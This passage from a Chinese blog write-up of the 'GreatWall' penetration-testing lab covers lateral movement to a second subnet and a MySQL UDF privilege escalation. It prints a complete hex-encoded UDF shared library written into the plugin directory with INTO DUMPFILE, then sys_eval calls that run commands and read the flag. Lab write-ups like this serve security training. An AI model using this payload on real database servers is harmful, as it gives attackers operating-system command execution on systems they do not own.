+<p><code>proxychains python harbor.py http://172.22.14.46/ --dump project/projectadmin --v2</code></p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425204051796.png" alt="image-20250425204051796"></p>
+<p>拿到一个jar包,找到数据库账号密码</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425204152556.png" alt="image-20250425204152556"></p>
+<h3 id="flag06"><a href="#flag06" class="headerlink" title="flag06"></a>flag06</h3><p>shiro的机子还有一个网段</p>
+<p><img src="/2024/07/30/hello-world/l/image-20250425175037198.png" alt="image-20250425175037198"></p>
+<p>扫一下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">172.22.10.28:80 open</span><br><span class="line">172.22.10.28:22 open</span><br><span class="line">172.22.10.16:22 open</span><br><span class="line">172.22.10.16:8080 open</span><br><span class="line">172.22.10.28:3306 open</span><br><span class="line">[*] WebTitle http://172.22.10.16:8080  code:302 len:0      title:None 跳转url: http://172.22.10.16:8080/login;jsessionid=42D75801B506D2A8CA2742DAA11F2B5B</span><br><span class="line">[*] WebTitle http://172.22.10.28       code:200 len:1975   title:DooTask</span><br><span class="line">[*] WebTitle http://172.22.10.16:8080/login;jsessionid=42D75801B506D2A8CA2742DAA11F2B5B code:200 len:3860   title:智联科技 ERP 后台登陆</span><br><span class="line">[+] PocScan http://172.22.10.16:8080 poc-yaml-spring-actuator-heapdump-file </span><br><span class="line">[+] PocScan http://172.22.10.16:8080 poc-yaml-springboot-env-unauth spring2</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>总结</p>
+<p>172.22.10.16 已拿下</p>
+<p>172.22.10.28 DooTask</p>
+</blockquote>
+<p>利用拿到的数据库账号密码，尝试用MDUT的udf提权但是失败了（貌似是MDUT需要走proxifiter的全局代理）</p>
+<p>那只能手动打了</p>
+<p>查看有无写入权限。若secure_file_priv为空这可以写入文件。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p><img src="/2024/07/30/hello-world/l/image-20250425205201272.png" alt="image-20250425205201272"></p>
+<p>查看插件位置（这一步是为了确定文件写入位置</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">'plugin%'</span>;</span><br><span class="line">#或者</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@plugin_dir</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/l/image-20250425205331041.png" alt="image-20250425205331041"></p>
+<p>查看操作系统版本</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@version_compile_os</span>, @<span class="variable">@version_compile_machine</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/l/image-20250425205359750.png" alt="image-20250425205359750"></p>
+<p>根据版本选择写入文件。<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光</a></p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">'/usr/lib/mysql/plugin/udf.so'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/l/image-20250425205630347.png" alt="image-20250425205630347"></p>
+<p>创建函数</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">'udf.so'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/l/image-20250425205648607.png" alt="image-20250425205648607"></p>
+<p>执行命令</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">'whoami'</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/07/30/hello-world/l/image-20250425205702504.png" alt="image-20250425205702504"></p>
+<p>最后拿flag</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">'cat /f*'</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/image-20250425205735350.png" alt="image-20250425205735350"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io">P4tt0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io/2025/04/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/">https://p4tt0n.github.io/2025/04/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://p4tt0n.github.io" target="_blank">P4tt0n's b10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CSpoofing/" title="春秋云镜Spoofing"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">春秋云镜Spoofing</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/" title="春秋云镜Initial"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="title">春秋云镜Initial</div></div></a></div><div><a href="/2025/02/21/Bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951-4/" title="Bugku渗透测试1-4"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-21</div><div class="title">Bugku渗透测试1-4</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/" title="春秋云镜Time"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Time</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/" title="春秋云镜Tsclient"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Tsclient</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cbrute4road/" title="春秋云镜brute4road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜brute4road</div></div></a></div><div><a href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="title">春秋云镜Hospital</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">P4tt0n</div><div class="author-info__description">徐徐前进！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/p4tt0n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GreatWall"><span class="toc-number">1.</span> <span class="toc-text">GreatWall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag01"><span class="toc-number">1.0.1.</span> <span class="toc-text">flag01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag02"><span class="toc-number">1.0.2.</span> <span class="toc-text">flag02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag03"><span class="toc-number">1.0.3.</span> <span class="toc-text">flag03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag04"><span class="toc-number">1.0.4.</span> <span class="toc-text">flag04</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag05"><span class="toc-number">1.0.5.</span> <span class="toc-text">flag05</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag06"><span class="toc-number">1.0.6.</span> <span class="toc-text">flag06</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CGreatWall/" title="春秋云镜GreatWall">春秋云镜GreatWall</a><time datetime="2025-04-26T01:11:56.000Z" title="发表于 2025-04-26 09:11:56">2025-04-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CSpoofing/" title="春秋云镜Spoofing">春秋云镜Spoofing</a><time datetime="2025-04-25T06:39:33.000Z" title="发表于 2025-04-25 14:39:33">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFlarum/" title="春秋云镜Flarum">春秋云镜Flarum</a><time datetime="2025-04-25T06:38:19.000Z" title="发表于 2025-04-25 14:38:19">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CDelivery/" title="春秋云镜Delivery">春秋云镜Delivery</a><time datetime="2025-04-25T06:36:39.000Z" title="发表于 2025-04-25 14:36:39">2025-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/25/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/" title="2022网鼎杯半决赛复盘">2022网鼎杯半决赛复盘</a><time datetime="2025-04-25T06:33:18.000Z" title="发表于 2025-04-25 14:33:18">2025-04-25</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2025 By P4tt0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = (ele) => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from(ele).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+    
+    codeMermaidEle.forEach(ele => {
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+  
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
